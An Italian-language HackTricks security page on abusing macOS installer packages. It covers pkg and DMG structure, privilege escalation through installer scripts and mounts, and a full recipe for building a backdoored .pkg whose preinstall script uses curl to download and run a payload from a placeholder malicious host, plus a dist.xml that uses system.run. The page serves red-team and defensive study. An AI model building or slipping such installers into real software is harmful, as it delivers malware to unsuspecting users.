# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Un **pacchetto di installazione** macOS (noto anche come file `.pkg`) è un formato di file utilizzato da macOS per **distribuire software**. Questi file sono come una **scatola che contiene tutto ciò di cui un software** ha bisogno per installarsi e funzionare correttamente.

Il file del pacchetto stesso è un archivio che contiene una **gerarchia di file e directory che verranno installati sul computer** di destinazione. Può anche includere **script** per eseguire operazioni prima e dopo l'installazione, come la configurazione di file di configurazione o la pulizia di versioni precedenti del software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Personalizzazioni (titolo, testo di benvenuto…) e controlli di script/installazione
- **PackageInfo (xml)**: Info, requisiti di installazione, posizione di installazione, percorsi degli script da eseguire
- **Bill of materials (bom)**: Elenco dei file da installare, aggiornare o rimuovere con permessi di file
- **Payload (CPIO archive gzip compresses)**: File da installare nella `install-location` da PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Script di pre e post installazione e altre risorse estratte in una directory temporanea per l'esecuzione.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Per visualizzare i contenuti dell'installer senza decomprimerlo manualmente, puoi anche utilizzare lo strumento gratuito [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## Informazioni di base sui DMG

I file DMG, o Apple Disk Images, sono un formato di file utilizzato da macOS di Apple per le immagini disco. Un file DMG è essenzialmente un **immagine disco montabile** (contiene il proprio filesystem) che contiene dati di blocco grezzi tipicamente compressi e talvolta crittografati. Quando apri un file DMG, macOS **lo monta come se fosse un disco fisico**, permettendoti di accedere ai suoi contenuti.

> [!CAUTION]
> Nota che gli installer **`.dmg`** supportano **così tanti formati** che in passato alcuni di essi contenenti vulnerabilità sono stati abusati per ottenere **l'esecuzione di codice nel kernel**.

### Gerarchia

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

La gerarchia di un file DMG può essere diversa in base al contenuto. Tuttavia, per i DMG delle applicazioni, di solito segue questa struttura:

- Livello superiore: Questo è la radice dell'immagine disco. Contiene spesso l'applicazione e possibilmente un collegamento alla cartella Applicazioni.
- Applicazione (.app): Questa è l'applicazione reale. In macOS, un'applicazione è tipicamente un pacchetto che contiene molti file e cartelle individuali che compongono l'applicazione.
- Collegamento Applicazioni: Questo è un collegamento alla cartella Applicazioni in macOS. Lo scopo di questo è facilitarti l'installazione dell'applicazione. Puoi trascinare il file .app su questo collegamento per installare l'app.

## Privesc tramite abuso di pkg

### Esecuzione da directory pubbliche

Se uno script di pre o post installazione, ad esempio, viene eseguito da **`/var/tmp/Installerutil`**, un attaccante potrebbe controllare quello script per poter elevare i privilegi ogni volta che viene eseguito. O un altro esempio simile:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Questa è una [funzione pubblica](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) che diversi installer e aggiornatori chiameranno per **eseguire qualcosa come root**. Questa funzione accetta il **percorso** del **file** da **eseguire** come parametro, tuttavia, se un attaccante potesse **modificare** questo file, sarebbe in grado di **abusare** della sua esecuzione con root per **elevare i privilegi**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Per ulteriori informazioni, controlla questo talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Esecuzione tramite montaggio

Se un installer scrive in `/tmp/fixedname/bla/bla`, è possibile **creare un mount** su `/tmp/fixedname` senza proprietari in modo da poter **modificare qualsiasi file durante l'installazione** per abusare del processo di installazione.

Un esempio di questo è **CVE-2021-26089** che è riuscito a **sovrascrivere uno script periodico** per ottenere l'esecuzione come root. Per ulteriori informazioni, dai un'occhiata al talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg come malware

### Payload vuoto

È possibile generare semplicemente un file **`.pkg`** con **script di pre e post-installazione** senza alcun payload reale a parte il malware all'interno degli script.

### JS in xml di distribuzione

È possibile aggiungere tag **`<script>`** nel file **xml di distribuzione** del pacchetto e quel codice verrà eseguito e può **eseguire comandi** utilizzando **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### Installer con backdoor

Installer malevolo che utilizza uno script e codice JS all'interno di dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Riferimenti

- [**DEF CON 27 - Unpacking Pkgs Uno sguardo all'interno dei pacchetti di installazione di Macos e delle comuni vulnerabilità di sicurezza**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "Il mondo selvaggio dei pacchetti di installazione di macOS" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs Uno sguardo all'interno dei pacchetti di installazione di MacOS**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
